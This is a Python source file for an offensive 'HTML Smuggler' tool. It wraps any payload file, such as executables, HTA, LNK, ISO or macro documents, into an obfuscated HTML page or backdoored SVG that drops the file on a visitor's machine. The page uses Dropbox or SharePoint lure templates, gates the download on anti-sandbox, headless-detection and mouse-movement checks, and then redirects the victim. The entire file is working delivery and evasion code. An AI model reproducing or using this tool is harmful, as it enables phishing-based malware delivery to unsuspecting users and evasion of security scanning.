#!/usr/bin/python3

import os, sys, re
import string
import uuid
import base64
import random
import mimetypes
import datetime
import argparse
import textwrap
import glob

try:
    from jsmin import jsmin

except ImportError:
    print('[!] No jsmin module installed. Install it with:')
    print('    pip install jsmin')
    sys.exit(1)


globalOpts = {
    'verbose': True, 
    'debug': False
}

template_default_settings = {
    'onedrive' : {
        'xhr_base_url' : 'https://coronafilho-my.sharepoint.com',
    }
}

class Logger:
    def __init__(self):
        pass

    def fatal(self, txt, **kwargs):
        print('[!] ' + txt)
        sys.exit(1)

    def text(self, txt, **kwargs):
        print(txt)

    def info(self, txt, **kwargs):
        print('[.] ' + txt)

    def err(self, txt, **kwargs):
        print('[-] ' + txt)

    def ok(self, txt, **kwargs):
        print('[+] ' + txt)

    def verbose(self, txt, **kwargs):
        if globalOpts['verbose']:
            print('[>] ' + txt)

    def dbg(self, txt, **kwargs):
        if globalOpts['debug']:
            print('[dbg] ' + txt)

logger = Logger()

def getTemplatePath(path):
    base = os.path.dirname(os.path.abspath(__file__))
    return os.path.abspath(os.path.normpath(os.path.join(base, 'templates/' + path)))

class Smuggler:

    Placeholders = {
        'HTML'                      : b'__HTML_SMUGGLING_PAYLOAD__',
        'OutputFilename'            : b'__SMUGGLED_FILENAME__',
        'FileSize'                  : b'__SMUGGLED_FILE_SIZE__',
        'FileSizeBytes'             : b'__SMUGGLED_FILE_SIZE_BYTES__',
        'FileModifiedTimestamp'     : b'__SMUGGLED_FILE_MODIFIED_TIMESTAMP__',
        'FileModifiedTime'          : b'__SMUGGLED_FILE_MODIFIED_TIME__',
    }

    DefaultDelay = 2000

    smugglerCore = getTemplatePath('smuggling.js')
    preloadCore = getTemplatePath('pre-load.js')
    entryPoint = getTemplatePath('entrypoint.js')
    svgEmbedTemplate = getTemplatePath('svg-embed.html')
    svgSmugglerCore = getTemplatePath('svg-smuggling.js')
    entryPointHeadless = getTemplatePath('entrypoint-headless.js')

    # src:
    # https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/embedinhtml.py#L18
    mimeTypeDict = {
        ".appinstaller": "application/xml",
        ".appx": "application/vns.ms-appx",
        ".appxbundle": "application/vns.ms-appx",

        ".bin": "application/octet-stream",
        ".cpl": "application/octet-stream",
        ".dll": "application/octet-stream",

        ".doc": "application/msword",
        ".docm": "application/msword",
        ".docx": "application/msword",
        ".dot": "application/msword",
        ".dotm": "application/msword",
        ".dotx": "application/msword",
        ".rtf": "application/msword",

        ".exe": "application/octet-stream",
        ".hta": "application/hta",
        ".html": "text/html",
        ".svg": "text/html",

        ".img": "application/octet-stream",
        ".iso": "application/octet-stream",

        ".js": "application/js",
        ".jse": "application/js",

        ".lnk": "application/x-ms-shortcut",

        ".msi" : "application/x-msi",
        ".msix": "application/msix",
        ".msixbundle": "application/msixbundle",

        ".pdf": "application/pdf",

        ".pps": "application/vnd.ms-powerpoint",
        ".ppsm": "application/vnd.ms-powerpoint",
        ".ppsx": "application/vnd.ms-powerpoint",
        ".ppt": "application/vnd.ms-powerpoint",
        ".pptm": "application/vnd.ms-powerpoint",
        ".pot": "application/vnd.ms-powerpoint",
        ".potm": "application/vnd.ms-powerpoint",
        ".potx": "application/vnd.ms-powerpoint",
        ".ppa": "application/vnd.ms-powerpoint",
        ".ppam": "application/vnd.ms-powerpoint",
        
        ".sct": "text/xml",
        ".slk": "application/vnd.ms-excel",

        ".vbe": "application/x-vbs",
        ".vbs": "application/x-vbs",

        ".vhd": "application/octet-stream",
        ".vhdx": "application/octet-stream",

        ".wsc": "text/xml",
        ".wsf": "text/xml",
        ".xsl": "text/xml",

        ".xll": "application/vnd.ms-excel",
        ".xls": "application/vnd.ms-excel",
        ".xlam": "application/vnd.ms-excel",
        ".xlsm": "application/vnd.ms-excel",
        ".xlsx": "application/vnd.ms-excel",
        ".xlw": "application/vnd.ms-excel",
        ".xltx": "application/vnd.ms-excel",
        ".xltm": "application/vnd.ms-excel",
        ".xlt": "application/vnd.ms-excel",
        ".xlsb": "application/vnd.ms-excel",
        ".xla": "application/vnd.ms-excel",
    }

    def __init__(self, logger, options):
        self.logger = logger
        self.options = options
        self.renamedSymbols = {}
        self.svgSmuggling = False

    @staticmethod
    def mimeTypeGuesser(infile):
        filepath, fileext = os.path.splitext(infile.lower())
        if fileext in Smuggler.mimeTypeDict.keys():
            return Smuggler.mimeTypeDict[fileext]

        guessed = mimetypes.MimeTypes().guess_type(infile)
        return guessed[0]

    def readDataFile(self, path):
        with open(path) as f:
            return f.read()

    def base64Encode(self, _txt):
        txt = bytearray(_txt)
        for i in range(len(txt)):
            a = (txt[i] - 35)
            if a < 0:
                a = (256 + txt[i]) - 35

            txt[i] = a

        return base64.b64encode(txt)

    def smuggle(self, htmlTemplate, outfileName, mimeType, origPayload):
        output = ''
        core = ''

        self.svgSmuggling = len(self.options.get('svg', '')) > 0

        payload = origPayload

        if self.svgSmuggling:
            core = self.readDataFile(Smuggler.svgSmugglerCore)
        else:
            core = self.readDataFile(Smuggler.smugglerCore)

        if not self.options['no_obfuscate']:
            
            #
            # That could be futher obfuscated, I know...
            #
            core = core.replace("'msSaveOrOpenBlob'", "window.atob('bXNTYX'+'ZlT3JPcGV'+'uQmxvYg==')")
            core = core.replace("'createObjectURL'", "window.atob('Y3JlYXRl'+'T2JqZWN'+'0VVJM')")
            core = core.replace("'download'", "window.atob('ZG93bmxv'+'YWQ=')")
            core = core.replace("'revokeObjectURL'", "window.atob('cmV2b'+'2tlT2J'+'qZWN0VVJM')")
            core = core.replace("'display: none'", "window.atob('ZGlz'+'cGxheTo'+'gbm9uZQ==')")

        self.logger.info('Will delay payload dropping for ' + str(self.options['delay']) + ' milliseconds.')

        troubleshoot = ''
        mousemoveEvents = str(self.options.get('mousemove_events', 20))
        testsThreshold = str(self.options.get('max_failed_tests', 2))

        if not self.options['mousemove']:
            mousemoveEvents = 0

        if self.options['no_detect_headless']:
            core += self.readDataFile(Smuggler.entryPoint)

        else:
            detectHeadless = self.readDataFile(Smuggler.entryPointHeadless)

            troubleshoot = '\tvar obf_troubleshoot = "=== Anti-Headless & Mouse-Movement troubleshoot report ===\\n";\r\n'

            if self.options['mousemove']:
                self.logger.info( f"Mouse Move events required to pass the User test: {mousemoveEvents} events.")
                self.logger.text(f'[+] File will be dropped only if user mouse movement is detected.', color='cyan')

                detectHeadless = detectHeadless.replace('//<<<MOUSEMOVE>>>//', '')

                troubleshoot += f'\tvar obf_testResS = (obf_mouseEventCounter >= {mousemoveEvents})? "PASSED" : "FAILED";\r\n'
                troubleshoot += f'\tobf_troubleshoot += "\\n(Test " + obf_testResS + ") Mouse-move events captured: " + obf_mouseEventCounter + ", expected: {mousemoveEvents}. ";\r\n'

            else:
                self.logger.text(f'[-] File will be dropped regardless of user mouse movement.', color='yellow')
                detectHeadless = detectHeadless.replace('//<<<MOUSEMOVE>>>//', '//')

            detectHeadless = detectHeadless.replace('<<<FAILED_TESTS_THRESHOLD>>>', testsThreshold)

            troubleshoot += f'\tvar obf_testResS2 = (obf_result <= {testsThreshold})? "PASSED" : "FAILED";\r\n'
            troubleshoot += f'\tobf_troubleshoot += "\\n(Test " + obf_testResS2 + ") Number of Anti-headless tests that failed: " + obf_result + ", expected no more than: {testsThreshold}. ";\r\n'

            troubleshoot += f'\tif(obf_mouseEventCounter < {mousemoveEvents}) {{ obf_failed += "obf_mousemove" }}\r\n'

            troubleshoot += f'\tif(obf_failed.length > 0) {{ obf_troubleshoot += "\\n\\nFollowing anti-headless tests failed: " + obf_failed; }}\r\n'

            troubleshoot += f'\tvar obf_testResS3 = ((obf_result > {testsThreshold}) || (obf_mouseEventCounter < {mousemoveEvents}))? "Will NOT drop the file as too many tests failed." : "Will drop the file as satisfying number of tests succeeded";\r\n'
            troubleshoot += f'\tobf_troubleshoot += "\\n\\n" + obf_testResS3;\r\n'

            core += '\n\n' + detectHeadless + '\n\n'

        if len(troubleshoot) > 0 and self.options.get('troubleshoot', False):
            troubleshoot += f'\talert(obf_troubleshoot);\r\n'
            core = core.replace('<<<TROUBLESHOOT_LOGIC>>>', troubleshoot)
        else:
            core = core.replace('<<<TROUBLESHOOT_LOGIC>>>', '')

        core = core.replace('<<<MOUSE_MOVE_EVENTS>>>', str(mousemoveEvents))

        redirect = ''
        wait = ''
        redirect_delay = self.options['redirect_delay']

        if redirect_delay > 0:
            wait = f'wait {redirect_delay} ms and '

        if self.options['url'] != None and len(self.options['url']) > 0:
            url = self.options['url']
            redirect = f'obf_redirect("{url}", "", {redirect_delay});'

            self.logger.info(f'After dropping file, will {wait}redirect to: "{url}"')

        elif self.options['get_url_param'] != None and len(self.options['get_url_param']) > 0:
            param = self.options['get_url_param']
            redirect = f'obf_redirect("get", "{param}", {redirect_delay});'

            self.logger.info(f'After dropping file, will {wait}redirect to GET parameter: "{param}"')

        elif self.options['hash_url_param'] != None and len(self.options['hash_url_param']) > 0:
            param = self.options['hash_url_param']
            redirect = f'obf_redirect("hash", "{param}", {redirect_delay});'

            self.logger.info(f'After dropping file, will {wait}redirect to Hash parameter: "{param}"')

        core = core.replace('<<<DELAY>>>', str(self.options['delay']))

        if not self.options['no_obfuscate']:
            outfileName64 = base64.b64encode(outfileName.encode()).decode()
            outfileName64 = outfileName64[:int(len(outfileName64)/2)] + "'+'" + outfileName64[int(len(outfileName64)/2):]

            mimeType = base64.b64encode(mimeType.encode()).decode()
            mimeType = mimeType[:int(len(mimeType)/2)] + "'+'" + mimeType[int(len(mimeType)/2):]

            core = core.replace("'<<<OUTPUT_FILENAME>>>'", f"window.atob('{outfileName64}')")
            core = core.replace("'<<<MIME_TYPE>>>'", f"window.atob('{mimeType}')")

        else:
            core = core.replace('<<<OUTPUT_FILENAME>>>', outfileName)
            core = core.replace('<<<MIME_TYPE>>>', mimeType)

        core = core.replace('<<<REDIRECT_STUB>>>', redirect)

        if not self.options['no_obfuscate']:
            core = self.renameSymbols(core)

        payloadenc = self.base64Encode(payload).decode()

        a = int(len(payloadenc) * 0.1)
        b = int(len(payloadenc) * 0.2)

        if b == 0:
            num = 1
        else:
            num = random.randint(a, b)

        if len(payload) <= num:
            num = int(len(payload) / 2)

        splitstep = 4
        if num > 4:
            splitstep = random.randint(4, num)

        splits = [payloadenc[start:start + splitstep] for start in range(0, len(payloadenc), splitstep)]

        payloadenc2 = ''

        for split in splits:
            sep = "'+'"
            a = random.randint(0, 10)
            if a % 10 == 0:
                sep = "'+''+'"
            elif a % 10 == 1:
                sep = "'+\"\"+'"
            elif a % 10 == 2:
                sep = "'+\"\"+''+'"
            elif a % 10 == 3:
                sep = "'+\"\"+\"\"+'"
            elif a % 10 == 4:
                sep = "'+''+\"\"+'"
            elif a % 10 == 5:
                sep = "'+[]+'"
            elif a % 10 == 6:
                sep = "'+['']+'"
            elif a % 10 == 7:
                sep = "'+[''+\"\"]+'"
            elif a % 10 == 8:
                sep = "'+[''+\"\"+'']+'"
            elif a % 10 == 9:
                sep = "'+[\"\"+'']+'"

            payloadenc2 += split + sep

        payloadenc = payloadenc2

        core = core.replace('<<<PAYLOAD>>>', payloadenc)

        if not self.options['no_obfuscate']:
            core = jsmin(core)

        html = self.readDataFile(htmlTemplate).encode()

        placeholder = Smuggler.Placeholders['HTML']
        headAppend = False
        
        if placeholder not in html:
            if re.search(br'<\s*/\s*head\s*>', html, re.I):
                self.logger.text(
                    f'[?] Warning: Could not find HTML placeholder ({placeholder.decode()}) in provided template file! Will append before </head>', color='magenta')
                headAppend = True
            else:
                self.logger.fatal(
                    f'Could not find HTML placeholder ({placeholder.decode()}) in provided template file!')

        symbol = 'obf_entryPoint'
        if not self.options['no_obfuscate']:
            symbol = self.renamedSymbols['obf_entryPoint']

        self.logger.info(f'Javascript entry point name: "{symbol}"')

        svgOut = self.options.get('outfile', '').lower().endswith('.svg')

        if self.svgSmuggling:
            self.logger.text('[+] Injecting smuggling payload into SVG file.')

            code = self.applySvgSmuggling(core, symbol)
            if svgOut:
                output = code
                html = ''
            else:
                output = html.replace(placeholder, code)
        else:
            self.logger.text('[+] Injecting smuggling payload into HTML structure.')

            code = f'''
<script type="text/javascript">
<<<CODE>>>
</script>
        '''.replace('<<<CODE>>>', core)

            if svgOut:
                output = code.encode()

            elif not headAppend:
                output = html.replace(placeholder, code.encode())

            else:
                html = re.sub(br'<\s*/\s*head\s*>', placeholder + b'</head>', html, flags=re.I, count=1)
                output = html.replace(placeholder, code.encode())

            m = re.search(br'<\s*body\b([^>]+)?>', output, flags=re.I)
            if m:
                replaced = False
                rest = m.group(1)
                if rest == None: 
                    rest = b''
                else:
                    if b'onload' in rest.lower():
                        rest = re.sub(br"""onload\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s]+))""", br'onload="\1 ; ' + symbol.encode() + b'();"', rest, flags=re.I, count=1)
                        rest = rest.replace(b';; ' + symbol.encode(), b'; ' + symbol.encode())
                        rest = rest.replace(b'; ; ' + symbol.encode(), b'; ' + symbol.encode())

                        output = output.replace(m.group(1), rest)
                        self.logger.info('Appending our entry point to currently held <body onload="...">:')
                        self.logger.info(f'\tCurrent onLoad:\t{m.group(1).decode()}')
                        self.logger.info(f'\tAltered onLoad:\t{rest.decode()}')
                        replaced = True

                if not replaced:
                    newbody = b'<body onload="' + symbol.encode() + b'();" ' + rest + b'>'
                    self.logger.info(f'Adding onload attribute to body:\n\t\t' + newbody.decode() + '\n')
                    output = output.replace(m.group(0), newbody)

        output = self.insertPreloader(output)
        output = self.applyPlaceholders(output, outfileName, origPayload)

        return output
    
    def applyPlaceholders(self, output, outfileName, origPayload):
        outfileSize = self.convertBytes(len(origPayload))
        outfileSizeBytes = len(origPayload)
        infile = self.options.get('infile', '')
        fileModifiedTimestamp = os.path.getmtime(infile)

        modifiedFileTime = self.printTime(fileModifiedTimestamp)

        output = output.replace(Smuggler.Placeholders['OutputFilename'], outfileName.encode())
        output = output.replace(Smuggler.Placeholders['FileSize'], outfileSize.encode())
        output = output.replace(Smuggler.Placeholders['FileSizeBytes'], str(outfileSizeBytes).encode())
        output = output.replace(Smuggler.Placeholders['FileModifiedTimestamp'], str(fileModifiedTimestamp).encode())
        output = output.replace(Smuggler.Placeholders['FileModifiedTimestamp'], modifiedFileTime.encode())

        return output
    
    def printTime(self, timestamp):
        dt = datetime.datetime.fromtimestamp(timestamp)
        return dt.strftime('%d/%m/%Y, %H:%M')        
    
    def convertBytes(self, num):
        for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
            if num < 1024.0:
                return f'{num:.1f} {x}'
            num /= 1024.0

    def fileSize(self, file_path):
        if os.path.isfile(file_path):
            file_info = os.stat(file_path)
            return self.convertBytes(file_info.st_size)

    def applySvgSmuggling(self, core, entryPoint):
        svgFile = self.options.get('svg', '')
        svgFile = os.path.abspath(os.path.normpath(svgFile))

        if len(svgFile) == 0 or not os.path.isfile(svgFile):
            self.logger.fatal(f'SVG file pointed by --svg does not exist:\n\t{svgFile}')

        svgData = self.readDataFile(svgFile)
        
        code = f'''
<script type="text/javascript">
<![CDATA[
<<<CODE>>>

{entryPoint}();
]]>
</script>
        '''.replace('<<<CODE>>>', core)

        dimension = self.options.get('dimension', '100,100,%').split(',')

        if len(dimension) != 3:
            self.logger.fatal(f'Invalid --dimension parameter format. Must be: Width,Height,Unit - for example: --dimension 100,100,%')

        dims = f' width="{dimension[0]}{dimension[2]}" height="{dimension[1]}{dimension[2]}" '

        m = re.search(r'<\s*\s*svg\s*', svgData, flags=re.I)
        if m:
            svgData = svgData.replace(m.group(0), m.group(0) + dims)
        else:
            self.logger.fatal('Input SVG file did not contain <svg> opening tag! Cannot inject Javascript payload into this SVG')

        svgData = svgData.strip()

        m = re.search(r'<\s*/\s*svg\s*>', svgData, flags=re.I)
        if m:
            svgData = svgData.replace(m.group(0), code + m.group(0))
        else:
            self.logger.fatal('Input SVG file did not contain </svg> closing tag! Cannot inject Javascript payload into this SVG')
        
        if self.options.get('encode', False):
            svgEmbedTemplate = self.readDataFile(Smuggler.svgEmbedTemplate)
            encoded = base64.b64encode(svgData.encode()).decode()
            embed = svgEmbedTemplate.replace('<<<SVG_PAYLOAD>>>', encoded)

            infile = self.options.get('infile', '')
            p, e = os.path.splitext(infile)
            n = os.path.basename(p)

            self.logger.text(f'''
========================================================================================
WARNING:

In SVG Smuggling scenario, when that SVG is encoded, we cannot control dropped file name.
Modern browsers instead of downloading {os.path.basename(infile)} will download something like:

    {str(uuid.uuid4())}{e}

========================================================================================
''', color='red')
    
            return embed.encode()

        return svgData.encode()

    def insertPreloader(self, html):
        preload = ''
        addPreload = False
        code = ''

        if len(self.options['xhr_base_url']) > 0: 
            base = self.options['xhr_base_url']

            if base[-1] == '/': base = base[:-1]

            addPreload = True
            code += f'''
    obf_setAjaxBaseAddress("{base}");
'''

        if addPreload:
            core = self.readDataFile(Smuggler.preloadCore).encode()
            preload = b'''
<script type="text/javascript">
CODE
</script>
'''.replace(b'CODE', core)

            preload = preload.replace(b'<<<PRELOAD_CODE>>>', code.encode())

            preload = self.renameSymbols(preload.decode())
            preload = jsmin(preload).encode()

            html = re.sub(br'<\s*/\s*head\s*>', preload + b'</head>', html, flags=re.I, count=1)

        return html

    @staticmethod
    def getRandomString(lengthFrom=5, lengthTo=15):
        return ''.join(random.choice(string.ascii_letters) for x in range(random.randint(lengthFrom, lengthTo)))

    def renameSymbols(self, code):
        rex = r'\b(obf_\w+)\b'
        replaces = {}

        for m in re.finditer(rex, code):
            old = m.group(1).strip()
            if old in replaces.keys(): continue

            replaces[old] = Smuggler.getRandomString()

        for old, new in replaces.items():
            if old == new: 
                continue
            
            self.renamedSymbols[old] = new

            if not self.options['no_obfuscate']:
                if new != old: 
                    self.logger.dbg(f"Renaming symbol: ({old[:25]}) ===> ({new[:25]}) ")

                code = code.replace(old, new)

        return code

    def removeComments(self, code):
        # comments already removed by jsmin
        return code

def getoptions():
    global globalOpts

    templatesPath = getTemplatePath('website-templates/')
    htmlTemplates = ''

    customArgs = []
    for i in range(len(sys.argv)):
        a = sys.argv[i]
        if a == '-o' or a == '--outfile':
            continue
        elif os.path.isfile(a) and ((a.lower().endswith('smuggler.py') or a == __file__)):
            if i == 0:
                continue
            else:
                customArgs.append(a)
        else:
            customArgs.append(a)

    for g in glob.glob(os.path.join(templatesPath, '*.html')):
        p = os.path.basename(g)
        if p.lower().endswith('.html'):
            p = p[:-5]

        htmlTemplates += f'\t- {p}\n'

    epilog = f'''

-----------------------------------------------------

Available HTML templates:

{htmlTemplates}

-----------------------------------------------------
'''

    usage = banner() + '\nUsage: smuggler.py [options] <infile>\n'
    opts = argparse.ArgumentParser(
        usage = usage,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent(epilog)
    )

    req = opts.add_argument_group('Required arguments')
    req.add_argument('infile', help = 'Input file to be embedded in HTML Smuggling manner or YAML with options')
    req.add_argument('outfile', help='Output file containing HTML with embedded payload. Use "-" to print to stdout.')

    opt = opts.add_argument_group('Options')
    opt.add_argument('-v', '--verbose', default=False, action='store_true', help='Verbose mode.')
    opt.add_argument('-d', '--debug', default=False, action='store_true', help='Debug mode.')
    opt.add_argument('-T', '--troubleshoot', default=False, action='store_true', help='Display Alert message with anti-headless results and mousemovement events captured for troubleshooting purposes.')
    #opt.add_argument('-e', '--encrypt', default=False, action='store_true', help='Encrypt payload using SubtleCrypto Javascript API and AES. Key will be randomly generated. CAUTION: Works only in HTTPS websites!')
    opt.add_argument('-N', '--nocolor', default=False, action='store_true', help='Dont use colors in text output.')
    opt.add_argument('-f', '--force', default=False, action='store_true', help='If specified output file already exists, force overwriting it.')

    ev = opts.add_argument_group('Evasion')
    ev.add_argument('-A', '--no-obfuscate', default=False, action='store_true', help='Dont obfuscate resulting HTML. By default HTML gets obfuscated.')
    ev.add_argument('-H', '---no-detect-headless', default=False, action='store_true', help='By default, this script adds logic that detects headless clients, or bots to avoid dropping payloads into unsafe environments. This option DISABLES this logic. Default: add headless detection.')
    ev.add_argument('-D', '--delay', default=Smuggler.DefaultDelay, type=int, help='Pause for this many milliseconds before dropping payload. Aims to evade emulators. Default: ' + str(Smuggler.DefaultDelay))
    ev.add_argument('-F', '--max-failed-tests', default=2, type=int, help='If headless detection is used, this parameter determines number of anti-headless tests that are accepted to fail. The bigger the number, the less certain we\'re to detect headless clients/bots but the more sure we\'re to deliver payload to the victim. Accepted values: <0..14>. Default: 2')
    ev.add_argument('-M', '--mousemove', default=False, action='store_true', help='Require Mouse Movement before downloading file. Number of events that needs to be generated before file can be downloaded are specified in --mousemove-events (default: 50). Default: don\'t require mouse movement.')
    ev.add_argument('--mousemove-events', default=10, type=int, help='Headless detection logic analyzes number of Mouse Move events. If there are more events than this number, test will conclude user is visiting our website. Otherwise it must be bot/sandbox. The higher the number, the more mouse movement required to pass the test. Default: 10 events.')
    
    loo = opts.add_argument_group('Look & Feel')
    loo.add_argument('-t', '--template', default='dropbox', help='Path to the HTML template file or a name from templates/website-templates. By default: "sharepoint" template is used.')
    loo.add_argument('-O', '--output-filename', metavar='NAME', default='', help='Name for the output file to be dropped. By default will use the name of the input payload file.')
    loo.add_argument('-m', '--mime-type', metavar='MIME', default='', help='Mime type for the dropped file. By default will automatically detect input payload\'s mimetype.')

    red = opts.add_argument_group('Redirect')
    red.add_argument('-u', '--url', default = '', help = 'After dropping file to target\'s computer, redirect to this URL.')
    red.add_argument('-U', '--get-url-param', metavar='PARAM', default = '', help = 'After dropping file to target\'s computer, redirect to URL stored in website\'s GET parameter named like speciifed. E.g. when URL is "https://example.com/foo.html?url=https://google.com" use --get-url-param "url" to denote that "url=" GET value should be used to redirect to.')
    red.add_argument('--hash-url-param', metavar='PARAM', default = '', help = 'After dropping file to target\'s computer, redirect to URL stored in website\'s hash parameter named like speciifed. E.g. when URL is "https://example.com/foo.html#hurl=https://google.com" use --hash-url-param "hurl" to denote that "hurl=" hash value should be used to redirect to.')
    red.add_argument('-y', '--redirect-delay', metavar='MILIS', default=0, help = 'After dropping file, wait this amount of miliseconds before redirecting to arbitrary URL.')
    red.add_argument('-x', '--xhr-base-url', metavar='URL', default='', help = 'If your HTML template does some XMLHttpRequest/Ajax requests to indirect paths ("/foo/bar"), you can set Base URL to prepend them with ("https://example.com/foo/bar"). This will help your template work better, generate less 404.')

    svg = opts.add_argument_group('SVG Smuggling')
    svg.add_argument('-s', '--svg', default='',
                     help='Path to input SVG file that will be injected with Javascript payload executing actual smuggling logic. ')
    svg.add_argument('-e', '--encode', default=False, action='store_true',
                    help='Encode backdoored SVG code and then emplace encoded form into HTML template.')
    svg.add_argument('-X', '--dimension', default='100,100,%',
                     help='SVG dimensions to use. Format width,height,unit. Default: 100,100,%% . Example: -X 300,150,px or -X 100,30,rem')
    
    args = opts.parse_args(customArgs)

    globalOpts.update(vars(args))

    if not os.path.isfile(args.template):
        path = getTemplatePath('website-templates/')

        p1 = ''
        if args.template.lower().endswith('.html'):
            p1 = os.path.join(path, args.template)
        else:
            p1 = os.path.join(path, args.template + '.html')

        if os.path.isfile(p1):
            args.template = p1
        else:
            logger.fatal('Could not locate specified HTML template file! Path: ' + args.template)

    if len(args.output_filename) == 0:
        args.output_filename = os.path.basename(args.infile)

    if len(args.mime_type) == 0:
        args.mime_type = Smuggler.mimeTypeGuesser(args.infile)

        if not args.mime_type or len(args.mime_type) == 0:
            logger.err(
                'Could not guess MIME type of input file! Specify target MIME type with --mime-type / -m .\n\tAssuming -m application/octet-stream')
            args.mime_type = 'application/octet-stream'

    logger.info(f'HTML Smuggled file will be dropped named as: ' + args.output_filename )

    tpl2 = os.path.basename(os.path.splitext(args.template)[0])
    if tpl2.lower() in template_default_settings.keys():
        for k, v in template_default_settings[tpl2.lower()].items():
            if hasattr(args, k):
                val = getattr(args, k)

                if type(val) == str and val == '':
                    setattr(args, k, v)
                elif type(val) == bool and not val:
                    setattr(args, k, v)

                logger.info(f'\t> Used default template-specific option: "{k}" = "{v}"')

    if args.outfile.lower().endswith('.svg') and len(args.svg) == 0:
        logger.fatal('To produce .svg file, you need to specify input --svg template picture to backdoor.\n\tExample: --svg templates\\svgs\\cartman.svg')

    globalOpts.update(vars(args))
    return args

def banner():
    return f'''
    :: HTML Smuggler - The sleazy underbelly of your friendly HTML
       Simple script that takes file on input and produces templated smuggling output.
       Mariusz 
        Edited by Maerih
'''

def main(argv):
    args = getoptions()
    if not args:
        return False

    logger.text(banner())

    if not os.path.isfile(args.infile):
        logger.fatal('Specified input payload file does not exist.')

    data = ''

    with open(args.infile, 'rb') as f:
        data = f.read()

    smuggler = Smuggler(logger, globalOpts)

    logger.text(f'[.] Embedding input file of type ({args.mime_type}) to HTML output...')

    output = smuggler.smuggle(
        args.template, 
        args.output_filename, 
        args.mime_type, 
        data
    )

    if not output:
        logger.fatal('Smuggling failed.')

    logger.info('Smuggling succeeded.')

    fname = os.path.basename(args.infile)
    if len(args.output_filename) > 0:
        fname = args.output_filename

    step = 0

    headless = ''
    if not args.no_detect_headless:
        step += 1
        headless = f'\t{step}. Detect headless clients or sandboxes & bail out if sniffs them\n'

    mousemove = ''
    if args.mousemove:
        step += 1
        mousemove = f'\t{step}. Await for user mouse movement activity'

        if args.mousemove_events > 0:
            mousemove += f' (will drop only after {args.mousemove_events} events)'

        mousemove += '\n'
    
    delay = ''
    if args.delay > 0:
        step += 1
        delay = f'\t{step}. Wait {float(args.delay/1000.0):.02} seconds\n'
    
    step += 1
    deliver = f'\t{step}. Drop file named "{fname}" as MIME {args.mime_type}\n'

    troubleshoot = ''
    if args.troubleshoot:
        step += 1
        troubleshoot = f'\t{step}. Display DEBUG alert message box with anti-headless and mouse-movement troubleshooting info\n'
    else:
        if len(headless) > 0 or len(mousemove) > 0:
            logger.text('[?] If your HTML Smuggling doesn\'t work, try using -T/--troubleshoot\n\tto see if mouse-movement/anti-headless tests are passing', color='yellow')

    redirect_delay = ''
    if args.redirect_delay > 0:
        redirect_delay = f'Wait another {float(args.redirect_delay/1000.0):.02} seconds and r'

    if len(redirect_delay) == 0:
        redirect_delay = 'R'

    redirect = ''
    if len(args.url) > 0:
        step += 1
        redirect = f'\t{step}. {redirect_delay}edirect victim to {args.url}\n'

    if len(args.get_url_param) > 0:
        step += 1
        redirect = f'\t{step}. {redirect_delay}edirect victim to whatever is pointed by /?{args.get_url_param}= GET param\n'

    if len(args.hash_url_param) > 0:
        step += 1
        redirect = f'\t{step}. {redirect_delay}edirect victim to whatever is pointed by /#{args.hash_url_param}= GET anchor\n'

    logger.text(f'''
[+] Landing page will: 

{headless}{mousemove}{delay}{deliver}{troubleshoot}{redirect}''')


    if args.outfile == '-':
        logger.text('\n--------------------------------------------------------------------------------------------------------------------------------\n')
        print(output.decode(errors='ignore'))
        logger.text('\n--------------------------------------------------------------------------------------------------------------------------------\n')

    else:
        with open(args.outfile, 'wb') as f:
            f.write(output)

        logger.text(f'\n[.] File Smuggled: {args.infile}')

        logger.text(f'[+] Generated file written to (size: {os.path.getsize(args.outfile)}): {args.outfile}\n', color='green')

    if len(args.svg) > 0:
        p, e = os.path.splitext(args.infile)
        logger.text(f'''
========================================================================================
WARNING:

In SVG Smuggling scenario, sometimes we cannot control dropped file name.
Modern browsers instead of downloading {os.path.basename(args.infile)} might download something like:

    {str(uuid.uuid4())}{e}

========================================================================================
''')

if __name__ == '__main__':
    main(sys.argv)
